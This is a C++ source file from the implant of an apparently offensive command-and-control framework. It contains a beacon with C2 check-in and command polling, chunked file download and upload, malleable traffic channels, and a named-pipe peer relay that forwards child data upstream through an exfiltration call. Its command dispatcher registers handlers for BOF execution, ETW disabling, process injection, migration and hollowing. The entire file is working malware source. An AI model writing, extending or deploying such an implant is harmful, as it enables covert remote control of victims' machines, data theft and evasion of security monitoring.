#include "../include/managers.h"
#include "../include/handlers.h"
#include "../include/utils.h"
#include "../include/network/net_abstract.h"
#include "../include/network/transport.h"
#include "../include/coff/COFFSetup.h"

/* ============================================================================
 * FileTransferManager Implementation
 * ============================================================================ */

FileTransferManager::FileTransferManager()
{
    for (uint8_t i = 0; i < MAX_FILE_TRANSFERS; ++i) {
        m_transfers[i].reset();
    }
}

FileTransferManager::~FileTransferManager() {
    for (uint8_t i = 0; i < MAX_FILE_TRANSFERS; ++i) {
        m_transfers[i].reset(g_functionTable);
    }
}

void FileTransferManager::initialize() {
    for (uint8_t i = 0; i < MAX_FILE_TRANSFERS; ++i) {
        m_transfers[i].reset(g_functionTable);
    }
}

uint64_t FileTransferManager::getCurrentTimestamp() {
    LARGE_INTEGER li;
    if (g_functionTable && g_functionTable->NtQuerySystemTime) {
        g_functionTable->NtQuerySystemTime(&li);
        return (uint64_t)li.QuadPart;
    }
    return 0;
}

bool FileTransferManager::isTransferStalled(const FileTransferState* state) const {
    if (state->status != FileTransferStatus::ACTIVE || state->lastActivity == 0) {
        return false;
    }

    uint64_t now = getCurrentTimestamp();
    if (now <= state->lastActivity) return false;

    uint64_t elapsed = now - state->lastActivity;
    /* NtQuerySystemTime returns 100ns units since 1601-01-01.
     * 300 seconds = 300 * 10,000,000 = 3,000,000,000 (3e9) 100ns ticks. */
    uint64_t timeoutTicks = static_cast<uint64_t>(TRANSFER_TIMEOUT_SECONDS) * 10000000ULL;

    return elapsed > timeoutTicks;
}

int FileTransferManager::findFreeSlot() {
    for (int i = 0; i < MAX_FILE_TRANSFERS; ++i) {
        if (m_transfers[i].direction == FileTransferDir::NONE) {
            return i;
        }
    }
    return -1;
}

FileTransferState* FileTransferManager::getTransfer(uint8_t slot_id) {
    if (slot_id >= MAX_FILE_TRANSFERS) {
        return nullptr;
    }
    return &m_transfers[slot_id];
}

void FileTransferManager::resetTransfer(uint8_t slot_id) {
    if (slot_id < MAX_FILE_TRANSFERS) {
        m_transfers[slot_id].reset(g_functionTable);
    }
}

FileTransferState* FileTransferManager::findActiveDownload() {
    for (int i = 0; i < MAX_FILE_TRANSFERS; ++i) {
        if (m_transfers[i].direction == FileTransferDir::DOWNLOAD &&
            m_transfers[i].status == FileTransferStatus::ACTIVE) {
            return &m_transfers[i];
        }
    }
    return nullptr;
}

FileTransferState* FileTransferManager::findActiveUpload() {
    for (int i = 0; i < MAX_FILE_TRANSFERS; ++i) {
        if (m_transfers[i].direction == FileTransferDir::UPLOAD &&
            m_transfers[i].status == FileTransferStatus::ACTIVE) {
            return &m_transfers[i];
        }
    }
    return nullptr;
}

bool FileTransferManager::validateDownloadPath(const wchar_t* path, uint16_t path_len) const {
    if (path_len >= 512) {
        return false;
    }
    return true;
}

bool FileTransferManager::validateUploadPath(const wchar_t* path, uint16_t path_len) const {
    if (path_len >= 512) {
        return false;
    }
    return true;
}

BeaconError FileTransferManager::startDownload(const wchar_t* file_path, uint32_t chunk_size) {
    // Find free slot
    int slot = findFreeSlot();
    if (slot < 0) {
        return BeaconError::TRANSFER_SLOT_EXHAUSTED;
    }

    FileTransferState* state = &m_transfers[slot];

    // Calculate path length
    uint16_t path_len = 0;
    while (file_path[path_len] && path_len < 512) {
        path_len++;
    }

    if (!validateDownloadPath(file_path, path_len)) {
        return BeaconError::INVALID_PARAMETER;
    }

    // Copy path
    safeWcsCopyN(state->path, file_path, path_len);

    // Set chunk size (cap at max)
    state->chunkSize = (chunk_size > pandragon::MAX_CHUNK_SIZE) ? pandragon::MAX_CHUNK_SIZE : chunk_size;

    // Get file size
    DWORD fileSize = 0;
    unsigned char* tempBuf = readFileFromDisk(g_functionTable, state->path, &fileSize);

    if (!tempBuf || fileSize == 0) {
        if (tempBuf) __free(tempBuf);
        return BeaconError::FILE_NOT_FOUND;
    }
    __free(tempBuf);

    // Initialize transfer state
    state->direction         = FileTransferDir::DOWNLOAD;
    state->status            = FileTransferStatus::ACTIVE;
    state->fileSize          = fileSize;
    state->bytesTransferred  = 0;
    state->expectedChunkIndex = 0;
    state->lastChunkIndex    = (fileSize + state->chunkSize - 1) / state->chunkSize;
    state->lastActivity      = getCurrentTimestamp();
    state->chunkCount        = 0;

    return BeaconError::SUCCESS;
}

BeaconError FileTransferManager::handleDownloadChunk(uint32_t chunk_index, uint32_t offset, 
                                                      uint32_t chunk_size) {
    FileTransferState* state = findActiveDownload();
    if (!state) {
        return BeaconError::NOT_INITIALIZED;
    }

    if (offset >= state->fileSize) {
        pandragon::sendFileChunkData(chunk_index, offset, 0, 2, nullptr);
        return BeaconError::INVALID_PARAMETER;
    }

    if (offset + chunk_size > state->fileSize) {
        chunk_size = state->fileSize - offset;
    }

    // Read chunk from disk
    DWORD bytesRead = 0;
    unsigned char* chunkData = readFileChunkFromDisk(
        g_functionTable, state->path, &bytesRead, static_cast<LONGLONG>(offset), chunk_size);

    if (!chunkData) {
        pandragon::sendFileChunkData(chunk_index, offset, 0, 2, nullptr);
        return BeaconError::FILE_READ_ERROR;
    }

    // Determine status (1 = last chunk, 0 = more coming)
    uint8_t status = (chunk_index >= state->lastChunkIndex - 1) ? 1 : 0;

    // Send chunk to server
    pandragon::sendFileChunkData(chunk_index, offset, bytesRead, status, chunkData);
    __free(chunkData);

    // Update state
    state->expectedChunkIndex = chunk_index + 1;
    state->bytesTransferred  += bytesRead;
    state->lastActivity       = getCurrentTimestamp();
    state->chunkCount++;

    // Check if transfer is complete
    if (status == 1 || state->bytesTransferred >= state->fileSize) {
        // Find and reset this slot
        for (int i = 0; i < MAX_FILE_TRANSFERS; ++i) {
            if (&m_transfers[i] == state) {
                m_transfers[i].reset(g_functionTable);
                break;
            }
        }
    }

    return BeaconError::SUCCESS;
}

BeaconError FileTransferManager::startUpload(const wchar_t* file_path, uint32_t file_size, 
                                              uint32_t chunk_size) {
    // Find free slot
    int slot = findFreeSlot();
    if (slot < 0) {
        return BeaconError::TRANSFER_SLOT_EXHAUSTED;
    }

    FileTransferState* state = &m_transfers[slot];

    // Calculate path length
    uint16_t path_len = 0;
    while (file_path[path_len] && path_len < 512) {
        path_len++;
    }

    if (!validateUploadPath(file_path, path_len)) {
        return BeaconError::INVALID_PARAMETER;
    }

    // Copy path
    safeWcsCopyN(state->path, file_path, path_len);

    // Set chunk size
    state->chunkSize = (chunk_size > pandragon::MAX_CHUNK_SIZE) ? pandragon::MAX_CHUNK_SIZE : chunk_size;

    // Create/truncate file
    writeFileToDisk(g_functionTable, state->path, nullptr, 0);

    // Initialize transfer state
    state->direction         = FileTransferDir::UPLOAD;
    state->status            = FileTransferStatus::ACTIVE;
    state->fileSize          = file_size;
    state->bytesTransferred  = 0;
    state->expectedChunkIndex = 0;
    state->lastActivity      = getCurrentTimestamp();
    state->chunkCount        = 0;

    return BeaconError::SUCCESS;
}

BeaconError FileTransferManager::handleUploadChunk(uint32_t chunk_index, uint32_t offset,
                                                    const uint8_t* chunk_data, uint32_t chunk_size,
                                                    bool is_last) {
    FileTransferState* state = findActiveUpload();
    if (!state) {
        pandragon::sendFileUploadAck(chunk_index, 1);
        return BeaconError::NOT_INITIALIZED;
    }

    // Write chunk to disk
    BOOL writeResult = writeFileChunkToDisk(
        g_functionTable, state->path, chunk_data, chunk_size, static_cast<LONGLONG>(offset));

    // Send acknowledgment
    uint8_t ack_status = writeResult ? 0 : 1;
    pandragon::sendFileUploadAck(chunk_index, ack_status);

    // Update state
    state->expectedChunkIndex = chunk_index + 1;
    state->bytesTransferred  += chunk_size;
    state->lastActivity       = getCurrentTimestamp();
    state->chunkCount++;

    // Check if transfer is complete
    if (is_last || state->bytesTransferred >= state->fileSize) {
        // Find and reset this slot
        for (int i = 0; i < MAX_FILE_TRANSFERS; ++i) {
            if (&m_transfers[i] == state) {
                m_transfers[i].reset(g_functionTable);
                break;
            }
        }
    }

    return writeResult ? BeaconError::SUCCESS : BeaconError::FILE_WRITE_ERROR;
}

void FileTransferManager::checkTimeouts() {
    for (int i = 0; i < MAX_FILE_TRANSFERS; ++i) {
        FileTransferState* state = &m_transfers[i];
        if (state->direction != FileTransferDir::NONE && isTransferStalled(state)) {
            state->status = FileTransferStatus::_ERROR;
            state->reset(g_functionTable);
        }
    }
}

/* ============================================================================
 * NetworkManager Implementation
 * ============================================================================ */

NetworkManager::NetworkManager()
    : m_initialized(false)
    , m_port(0)
{
    m_host[0]       = L'\0';
    m_path[0]       = L'\0';
    m_userAgent[0]  = L'\0';
}

NetworkManager::~NetworkManager() {
    m_initialized = false;
}

BeaconError NetworkManager::initialize(const wchar_t* host, const wchar_t* path,
                                        const wchar_t* user_agent, uint16_t port) {
    if (!host || !path || !user_agent) {
        return BeaconError::INVALID_PARAMETER;
    }

    // Copy strings safely
    size_t hostLen = __wcslen(host);
    size_t pathLen = __wcslen(path);
    size_t uaLen = __wcslen(user_agent);

    if (hostLen >= 256 || pathLen >= 256 || uaLen >= 256) {
        return BeaconError::BUFFER_TOO_SMALL;
    }

    safeWcsCopyBounded(m_host, host, 256);
    safeWcsCopyBounded(m_path, path, 256);
    safeWcsCopyBounded(m_userAgent, user_agent, 256);

    m_port = port;

    // Initialize the underlying network layer
    ::initNetwork(g_functionTable, m_host, m_path, m_userAgent, m_port);
    m_initialized = true;

    return BeaconError::SUCCESS;
}

void NetworkManager::setIdentity(const uint8_t* beacon_id, const uint8_t* crypto_key) {
    if (beacon_id && crypto_key) {
        ::setBeaconIdentity(beacon_id, crypto_key);
    }
}

void NetworkManager::setMalleableConfig(const BeaconConfig& config) {
    if (config.has_malleable_config) {
        ::setMalleableConfigFromBeaconConfig(&config);
    }
}

void NetworkManager::setActiveChannel(uint8_t channelIndex, const BeaconConfig& config) {
    if (channelIndex >= config.channel_count || !config.channels) {
        g_debugPrint("[NetworkManager::setActiveChannel] Invalid channelIndex=%u (count=%u, channels=%p)",
                     (unsigned)channelIndex, (unsigned)config.channel_count, (void*)config.channels);
        return;
    }

    const PCFG_C2Channel* ch = &config.channels[channelIndex];

    // Guard against NULL strings (allocation failure during parse)
    if (!ch->host || !ch->path || !ch->user_agent) {
        g_debugPrint("[setActiveChannel] Channel %u has NULL strings (malloc failure)", (unsigned)channelIndex);
        return;
    }

    g_debugPrint("[setActiveChannel] Switching to channel %u: %s:%d%s (type=%u)",
                 (unsigned)channelIndex, ch->host, ch->port, ch->path, (unsigned)ch->type);

    // Convert strings to wide char using reusable buffer (no malloc)
    size_t host_len = __strlen(ch->host);
    size_t path_len = __strlen(ch->path);
    size_t ua_len = __strlen(ch->user_agent);

    // Check buffer capacity
    if (host_len >= 256 || path_len >= 256 || ua_len >= 256) {
        g_debugPrint("[setActiveChannel] Channel %u string too long for buffer", (unsigned)channelIndex);
        return;
    }

    __mbstowcs(m_wcsBuf, ch->host, host_len);
    m_wcsBuf[host_len] = L'\0';
    safeWcsCopyBounded(m_host, m_wcsBuf, 256);

    __mbstowcs(m_wcsBuf, ch->path, path_len);
    m_wcsBuf[path_len] = L'\0';
    safeWcsCopyBounded(m_path, m_wcsBuf, 256);

    __mbstowcs(m_wcsBuf, ch->user_agent, ua_len);
    m_wcsBuf[ua_len] = L'\0';
    safeWcsCopyBounded(m_userAgent, m_wcsBuf, 256);

    // Initialize underlying network layer
    ::initNetwork(g_functionTable, m_host, m_path, m_userAgent, ch->port);

    // Set channel security mode
    bool isHttps = (ch->type == PCFG_CHANNEL_HTTPS);
    ::setChannelSecure(isHttps);

    // Set HTTP method
    ::setHttpMethod(ch->http_method);

    m_port = ch->port;
    m_initialized = true;

    // Resolve malleable config for this channel
    uint8_t malleable_mode = ch->malleable_mode;

    g_debugPrint("[setActiveChannel] Channel %u: malleable_mode=0x%02x, has_malleable_config=%u",
        (unsigned)channelIndex, (unsigned)malleable_mode, (unsigned)config.has_malleable_config);

    if (malleable_mode == PCFG_MALLEABLE_INLINE && config.channel_malleable) {
        // Use per-channel inline malleable
        g_debugPrint("[setActiveChannel] Using inline malleable for channel %u", (unsigned)channelIndex);
        ::setMalleableFromChannelMalleable(&config.channel_malleable[channelIndex]);

        // Also configure TCP malleable (prefix/suffix for raw TCP framing)
        if (ch->type == PCFG_CHANNEL_TCP) {
            ::setTcpMalleable(
                config.channel_malleable[channelIndex].wrapper_prefix,
                config.channel_malleable[channelIndex].wrapper_prefix_len,
                config.channel_malleable[channelIndex].wrapper_suffix,
                config.channel_malleable[channelIndex].wrapper_suffix_len
            );
        }
    } else if (malleable_mode == PCFG_MALLEABLE_GLOBAL && config.has_malleable_config) {
        // Use global malleable
        g_debugPrint("[setActiveChannel] Using global malleable for channel %u", (unsigned)channelIndex);
        ::setMalleableConfigFromBeaconConfig(&config);

        // Also configure TCP malleable from global
        if (ch->type == PCFG_CHANNEL_TCP) {
            ::setTcpMalleable(
                config.global_malleable.wrapper_prefix,
                config.global_malleable.wrapper_prefix_len,
                config.global_malleable.wrapper_suffix,
                config.global_malleable.wrapper_suffix_len
            );
        }
    } else {
        // No malleable (TCP or bare channel)
        g_debugPrint("[setActiveChannel] No malleable for channel %u (mode=0x%02x)",
                     (unsigned)channelIndex, (unsigned)malleable_mode);
        ::clearMalleableConfig();
        if (ch->type == PCFG_CHANNEL_TCP) {
            ::setTcpMalleable(nullptr, 0, nullptr, 0);
        }
    }
}

BeaconError NetworkManager::sendCheckin(const char* sysinfo, size_t sysinfo_len) {
    if (!m_initialized) {
        g_debugPrint("[NetworkManager::sendCheckin] Not initialized!");
        return BeaconError::NOT_INITIALIZED;
    }

    g_debugPrint("[NetworkManager::sendCheckin] Calling sendCheckin(sysinfo=%p, len=%zu)...", (const void*)sysinfo, sysinfo_len);
    bool result = ::sendCheckin(sysinfo, sysinfo_len);
    g_debugPrint("[NetworkManager::sendCheckin] sendCheckin() returned: %d", (int)result);
    return result ? BeaconError::SUCCESS : BeaconError::NETWORK_ERROR;
}

BeaconError NetworkManager::pollForCommands(uint8_t** out_buffer, size_t* out_len) {
    if (!m_initialized || !out_buffer || !out_len) {
        g_debugPrint("[NetworkManager::pollForCommands] Invalid params: m_initialized=%d, out_buffer=%p, out_len=%p",
                     (int)m_initialized, (void*)out_buffer, (void*)out_len);
        return BeaconError::INVALID_PARAMETER;
    }

    g_debugPrint("[NetworkManager::pollForCommands] Calling getMessage()...");
    auto result = ::getMessage();
    g_VERBOSE("[NetworkManager::pollForCommands] getMessage returned: first=%p, second=%zu",
                 (void*)result.first, result.second);
    
    if (result.first && result.second > 0) {
        *out_buffer = reinterpret_cast<uint8_t*>(result.first);
        *out_len = result.second;
        g_VERBOSE("[NetworkManager::pollForCommands] Received %zu bytes of command data", result.second);
        return BeaconError::SUCCESS;
    }

    g_debugPrint("[NetworkManager::pollForCommands] No data received");
    return BeaconError::NETWORK_ERROR;
}

BeaconError NetworkManager::sendResponse(uint8_t opcode, const uint8_t* data, size_t data_len) {
    if (!m_initialized) {
        return BeaconError::NOT_INITIALIZED;
    }

    // Use sendData for raw response data
    ::sendData(data, data_len);
    return BeaconError::SUCCESS;
}

BeaconError NetworkManager::sendFileContent(const wchar_t* path, const uint8_t* data,
                                             uint32_t size, uint8_t status) {
    if (!m_initialized) {
        return BeaconError::NOT_INITIALIZED;
    }

    pandragon::sendFileContent(path, data, size, status);
    return BeaconError::SUCCESS;
}

BeaconError NetworkManager::sendFileChunkData(uint32_t chunk_index, uint32_t offset,
                                               uint32_t bytes_read, uint8_t status,
                                               const uint8_t* data) {
    if (!m_initialized) {
        return BeaconError::NOT_INITIALIZED;
    }

    pandragon::sendFileChunkData(chunk_index, offset, bytes_read, status, data);
    return BeaconError::SUCCESS;
}

BeaconError NetworkManager::sendFileUploadAck(uint32_t chunk_index, uint8_t status) {
    if (!m_initialized) {
        return BeaconError::NOT_INITIALIZED;
    }

    pandragon::sendFileUploadAck(chunk_index, status);
    return BeaconError::SUCCESS;
}

BeaconError NetworkManager::sendFileDownloadAck(uint32_t file_size, uint8_t status) {
    if (!m_initialized) {
        return BeaconError::NOT_INITIALIZED;
    }

    pandragon::sendFileDownloadAck(file_size, status);
    return BeaconError::SUCCESS;
}


BeaconError NetworkManager::sendKeyRotateAck(uint8_t status) {
    if (!m_initialized) {
        return BeaconError::NOT_INITIALIZED;
    }

    pandragon::sendKeyRotateAck(status);
    return BeaconError::SUCCESS;
}

BeaconError NetworkManager::sendFileWriteResult(uint8_t status) {
    if (!m_initialized) {
        return BeaconError::NOT_INITIALIZED;
    }

    pandragon::sendFileWriteResult(status);
    return BeaconError::SUCCESS;
}

/* ============================================================================
 * CommandDispatcher Implementation
 * ============================================================================ */

CommandDispatcher::CommandDispatcher()
{
    for (int i = 0; i < 256; ++i) {
        m_handlers[i] = nullptr;
    }
}

CommandDispatcher::~CommandDispatcher() {
}

BeaconError CommandDispatcher::registerHandler(uint8_t opcode, HandlerFunc handler) {
    // opcode is uint8_t, so it's always < 256, but keep check for API safety
    (void)opcode;  // Bounds check implicit for uint8_t
    m_handlers[opcode] = handler;
    return BeaconError::SUCCESS;
}

bool CommandDispatcher::dispatch(uint8_t opcode, const uint8_t* args, size_t args_len) {
    // opcode is uint8_t, so it's always < 256
    HandlerFunc handler = m_handlers[opcode];
    if (!handler) {
        return false;
    }

    return handler(args, args_len);
}

void CommandDispatcher::initializeBuiltInHandlers() {
    using namespace pandragon::handlers;

    registerHandler(0x01, handleEcho);
    registerHandler(0x02, handleSleep);
    registerHandler(0x10, handleBofExec);
    registerHandler(0x11, handleBofFree);
    registerHandler(0x14, handleLongRunningBof);
    registerHandler(0x12, handleFileDownload);
    registerHandler(0x13, handleFileUpload);
    registerHandler(0x1E, handleRotateKey);
    registerHandler(0x20, handleFileDownloadStart);
    registerHandler(0x21, handleFileDownloadChunk);
    registerHandler(0x22, handleFileUploadStart);
    registerHandler(0x23, handleFileUploadChunk);
    registerHandler(0x25, handleEtwEnable);
    registerHandler(0x26, handleEtwDisable);
    registerHandler(0x30, handleInjectProcess);
    registerHandler(0x31, handleMigrate);
    registerHandler(0x32, handleHollowProcess);

    // Relay opcodes
    registerHandler(0x40, handleStartRelay);
    registerHandler(0x41, handleStopRelay);
    registerHandler(0x42, handleRelayAddChild);
    registerHandler(0x43, handleRelayRemoveChild);
    registerHandler(0x44, handleRelayDown);

    // Kill
    registerHandler(0xFF, handleExit);
}

/* ============================================================================
 * P2P Relay Engine Implementation
 * ============================================================================ */

// Global relay state (defined once)
bool          g_relayEnabled = false;
PipeChild*    g_pipeChildren  = nullptr;
uint32_t      g_nextPipeId    = 1;

/* -- Helper: Little-endian uint32 reader --------------------------------- */
static inline uint32_t relayReadLE32(const uint8_t* p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

/* -- Enable relay mode --------------------------------------------------- */
void relayEnable() {
    g_relayEnabled = true;
}

/* -- Disable relay mode: drain all children ------------------------------ */
void relayDisable() {
    g_relayEnabled = false;
    relayCleanup();
}

/* -- Add a child to the relay list --------------------------------------- */
bool relayAddChild(const wchar_t* pipe_name, size_t pipe_name_len, uint32_t pipe_id) {
    if (!pipe_name || pipe_name_len == 0 || pipe_name_len >= MAX_PIPE_NAME_LEN)
        return false;

    // Check for duplicate pipe_id
    for (PipeChild* pc = g_pipeChildren; pc; pc = pc->next) {
        if (pc->pipe_id == pipe_id) return false;
    }

    // Count existing children
    int count = 0;
    for (PipeChild* pc = g_pipeChildren; pc; pc = pc->next) count++;
    if (count >= MAX_RELAY_CHILDREN) {
        g_debugPrint("[RELAY] Max children (%d) reached", MAX_RELAY_CHILDREN);
        return false;
    }

    // Allocate new child
    PipeChild* pc = (PipeChild*)__malloc(sizeof(PipeChild));
    if (!pc) return false;
    __memset(pc, 0, sizeof(PipeChild));

    // Copy pipe name
    for (size_t i = 0; i < pipe_name_len && i < MAX_PIPE_NAME_LEN - 1; i++)
        pc->pipe_name[i] = pipe_name[i];
    pc->pipe_name[pipe_name_len] = L'\0';

    // Build full path: \\.\pipe\<name>
    wchar_t fullPath[MAX_PIPE_PATH];
    const wchar_t prefix[] = L"\\\\.\\pipe\\";
    const size_t prefixLen = sizeof(prefix) / sizeof(wchar_t) - 1;
    for (size_t i = 0; i < prefixLen; i++) fullPath[i] = prefix[i];
    for (size_t i = 0; i < pipe_name_len; i++) fullPath[prefixLen + i] = pipe_name[i];
    fullPath[prefixLen + pipe_name_len] = L'\0';

    // Create listening pipe (overlapped for non-blocking accept)
    pc->hListen = g_functionTable->CreateNamedPipeW(
        fullPath,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE,
        PIPE_UNLIMITED_INSTANCES,
        0, 0, 0, NULL
    );

    if (pc->hListen == INVALID_HANDLE_VALUE) {
        g_debugPrint("[RELAY] CreateNamedPipeW failed: %lu", g_functionTable->GetLastError());
        __free(pc);
        return false;
    }

    // Create event for overlapped I/O
    pc->ov.hEvent = g_functionTable->CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!pc->ov.hEvent) {
        g_functionTable->NtClose(pc->hListen);
        __free(pc);
        return false;
    }

    // Start async accept
    BOOL result = g_functionTable->ConnectNamedPipe(pc->hListen, &pc->ov);
    DWORD lastErr = g_functionTable->GetLastError();
    // ConnectNamedPipe returns FALSE but ERROR_IO_PENDING means accept is pending
    if (!result && lastErr != ERROR_IO_PENDING && lastErr != ERROR_PIPE_CONNECTED) {
        g_debugPrint("[RELAY] ConnectNamedPipe failed: %lu", lastErr);
        g_functionTable->NtClose(pc->ov.hEvent);
        g_functionTable->NtClose(pc->hListen);
        __free(pc);
        return false;
    }

    pc->pipe_id = pipe_id;
    pc->hData = INVALID_HANDLE_VALUE;
    pc->active = true;
    pc->created_at = 0;  // Will be set by NtQuerySystemTime if needed
    pc->next = g_pipeChildren;
    g_pipeChildren = pc;

    g_debugPrint("[RELAY] Child added: pipe_id=%u, pipe=%ls", pipe_id, pipe_name);
    return true;
}

/* -- Remove a child from the relay list ---------------------------------- */
bool relayRemoveChild(uint32_t pipe_id) {
    PipeChild** pp = &g_pipeChildren;
    while (*pp) {
        if ((*pp)->pipe_id == pipe_id) {
            PipeChild* victim = *pp;
            *pp = victim->next;

            // Clean up
            if (victim->hData != INVALID_HANDLE_VALUE) {
                g_functionTable->DisconnectNamedPipe(victim->hData);
                g_functionTable->NtClose(victim->hData);
            }
            if (victim->hListen != INVALID_HANDLE_VALUE) {
                g_functionTable->DisconnectNamedPipe(victim->hListen);
                g_functionTable->NtClose(victim->hListen);
            }
            if (victim->ov.hEvent) {
                g_functionTable->NtClose(victim->ov.hEvent);
            }

            g_debugPrint("[RELAY] Child removed: pipe_id=%u", pipe_id);
            __free(victim);
            return true;
        }
        pp = &(*pp)->next;
    }
    return false;
}

/* -- Try to accept a child (non-blocking, overlapped I/O) ---------------- */
static bool tryAcceptChild(PipeChild* pc) {
    if (!pc || !pc->active || !pc->hListen) return false;

    // Check if ConnectNamedPipe completed (zero wait)
    DWORD result = g_functionTable->WaitForSingleObject(pc->ov.hEvent, 0);
    if (result != WAIT_OBJECT_0) return false;

    // Child connected - open data handle
    // Build full path
    wchar_t fullPath[MAX_PIPE_PATH];
    const wchar_t prefix[] = L"\\\\.\\pipe\\";
    const size_t prefixLen = sizeof(prefix) / sizeof(wchar_t) - 1;
    for (size_t i = 0; i < prefixLen; i++) fullPath[i] = prefix[i];
    size_t nameLen = 0;
    while (pc->pipe_name[nameLen] && nameLen < MAX_PIPE_NAME_LEN) {
        fullPath[prefixLen + nameLen] = pc->pipe_name[nameLen];
        nameLen++;
    }
    fullPath[prefixLen + nameLen] = L'\0';

    pc->hData = g_functionTable->CreateFileW(
        fullPath,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL
    );

    if (pc->hData == INVALID_HANDLE_VALUE) {
        g_debugPrint("[RELAY] CreateFileW for data failed: %lu",
                     g_functionTable->GetLastError());
        // Reset accept for next child
        g_functionTable->ResetEvent(pc->ov.hEvent);
        g_functionTable->DisconnectNamedPipe(pc->hListen);
        g_functionTable->ConnectNamedPipe(pc->hListen, &pc->ov);
        return false;
    }

    g_debugPrint("[RELAY] Child connected on pipe_id=%u", pc->pipe_id);

    // Reset for next child
    g_functionTable->ResetEvent(pc->ov.hEvent);
    g_functionTable->DisconnectNamedPipe(pc->hListen);
    g_functionTable->ConnectNamedPipe(pc->hListen, &pc->ov);
    return true;
}

/* -- Check if pipe has data (non-blocking peek) -------------------------- */
static bool pipeHasData(HANDLE hPipe) {
    if (!hPipe || hPipe == INVALID_HANDLE_VALUE) return false;
    DWORD available = 0;
    return g_functionTable->PeekNamedPipe(hPipe, NULL, 0, NULL, &available, NULL)
           && available >= 4;
}

/* -- Read a length-prefixed frame from pipe ------------------------------ */
static std::pair<void*, size_t> readPipeFrame(HANDLE hPipe) {
    if (!hPipe || hPipe == INVALID_HANDLE_VALUE) return { nullptr, 0 };

    // Read 4-byte BE length
    uint8_t lenBuf[4] = {0};
    DWORD read = 0;
    if (!g_functionTable->ReadFile(hPipe, lenBuf, 4, &read, NULL) || read != 4)
        return { nullptr, 0 };

    uint32_t frameLen = ((uint32_t)lenBuf[0] << 24) | ((uint32_t)lenBuf[1] << 16) |
                        ((uint32_t)lenBuf[2] << 8)  | ((uint32_t)lenBuf[3]);

    if (frameLen == 0) return { nullptr, 0 };
    if (frameLen > 64 * 1024 * 1024) {
        g_debugPrint("[RELAY] Frame too large: %u", frameLen);
        return { nullptr, 0 };
    }

    uint8_t* buf = (uint8_t*)__malloc(frameLen + 1);
    if (!buf) return { nullptr, 0 };

    uint32_t totalRead = 0;
    while (totalRead < frameLen) {
        DWORD toRead = frameLen - totalRead;
        if (!g_functionTable->ReadFile(hPipe, buf + totalRead, toRead, &read, NULL) || read == 0) {
            __free(buf);
            return { nullptr, 0 };
        }
        totalRead += read;
    }

    buf[frameLen] = '\0';
    return { buf, (size_t)frameLen };
}

/* -- Write a length-prefixed frame to pipe ------------------------------- */
static bool writePipeFrame(HANDLE hPipe, const void* data, size_t dataLen) {
    if (!hPipe || hPipe == INVALID_HANDLE_VALUE || !data || dataLen == 0) return false;

    uint8_t lenBuf[4];
    lenBuf[0] = (uint8_t)((dataLen >> 24) & 0xFF);
    lenBuf[1] = (uint8_t)((dataLen >> 16) & 0xFF);
    lenBuf[2] = (uint8_t)((dataLen >> 8) & 0xFF);
    lenBuf[3] = (uint8_t)(dataLen & 0xFF);

    DWORD written = 0;
    if (!g_functionTable->WriteFile(hPipe, lenBuf, 4, &written, NULL) || written != 4)
        return false;

    if (!g_functionTable->WriteFile(hPipe, (LPVOID)data, (DWORD)dataLen, &written, NULL)
        || written != (DWORD)dataLen)
        return false;

    return true;
}

/* -- Send relay child data upstream (RELAY_CHILD_UP) --------------------- */
void sendRelayChildUp(uint32_t pipe_id, const void* data, size_t data_len) {
    // Build payload: [opcode (1B)] [pipe_id (4B LE)] [child_pkt_len (4B BE)] [child_encrypted_packet]
    size_t payloadLen = 1 + 4 + 4 + data_len;
    uint8_t* payload = (uint8_t*)__malloc(payloadLen);
    if (!payload) return;

    payload[0] = 0x40;  // RELAY_CHILD_UP opcode
    payload[1] = (uint8_t)(pipe_id & 0xFF);
    payload[2] = (uint8_t)((pipe_id >> 8) & 0xFF);
    payload[3] = (uint8_t)((pipe_id >> 16) & 0xFF);
    payload[4] = (uint8_t)((pipe_id >> 24) & 0xFF);
    payload[5] = (uint8_t)((data_len >> 24) & 0xFF);
    payload[6] = (uint8_t)((data_len >> 16) & 0xFF);
    payload[7] = (uint8_t)((data_len >> 8) & 0xFF);
    payload[8] = (uint8_t)(data_len & 0xFF);
    __memcpy(payload + 9, data, data_len);

    // Send via existing transport (same path as check-in/poll)
    ::sendExfil(payload, payloadLen, L"");

    __free(payload);
}

/* -- Handle RELAY_DOWN (server -> parent -> child) ------------------------- */
bool relayHandleRelayDown(const uint8_t* args, size_t args_len) {
    // [pipe_id (4B LE)] [encrypted packet...]
    if (args_len < 4) return false;

    uint32_t pipe_id = relayReadLE32(args);
    const uint8_t* childData = args + 4;
    size_t childLen = args_len - 4;

    // Find the child by pipe_id
    for (PipeChild* pc = g_pipeChildren; pc; pc = pc->next) {
        if (pc->pipe_id == pipe_id && pc->active && pc->hData != INVALID_HANDLE_VALUE) {
            if (!writePipeFrame(pc->hData, childData, childLen)) {
                g_debugPrint("[RELAY] DOWN: write failed for pipe_id=%u", pipe_id);
                // Child may be dead - mark for cleanup next iteration
                pc->active = false;
            }
            return false;  // don't exit beacon
        }
    }

    g_debugPrint("[RELAY] DOWN: pipe_id=%u not found", pipe_id);
    return false;
}

/* -- Main loop: drain child data before normal polling ------------------- */
void pipeRelayCheck() {
    if (!g_relayEnabled || !g_pipeChildren) return;

    for (PipeChild* pc = g_pipeChildren; pc; pc = pc->next) {
        if (!pc->active) continue;

        // Try to accept a child (non-blocking)
        if (pc->hData == INVALID_HANDLE_VALUE) {
            if (tryAcceptChild(pc)) {
                // Child just connected - data next iteration
                continue;
            }
        }

        // Child connected - check for data
        if (pipeHasData(pc->hData)) {
            auto frame = readPipeFrame(pc->hData);
            if (frame.first) {
                sendRelayChildUp(pc->pipe_id, frame.first, frame.second);
                __free(frame.first);
            } else {
                // Read failed - child probably disconnected
                g_debugPrint("[RELAY] Read failed for pipe_id=%u, marking inactive", pc->pipe_id);
                pc->active = false;
                if (pc->hData != INVALID_HANDLE_VALUE) {
                    g_functionTable->NtClose(pc->hData);
                    pc->hData = INVALID_HANDLE_VALUE;
                }
            }
        }
    }
}

/* -- Cleanup all relay state --------------------------------------------- */
void relayCleanup() {
    while (g_pipeChildren) {
        relayRemoveChild(g_pipeChildren->pipe_id);
    }
    g_relayEnabled = false;
    g_nextPipeId = 1;
}

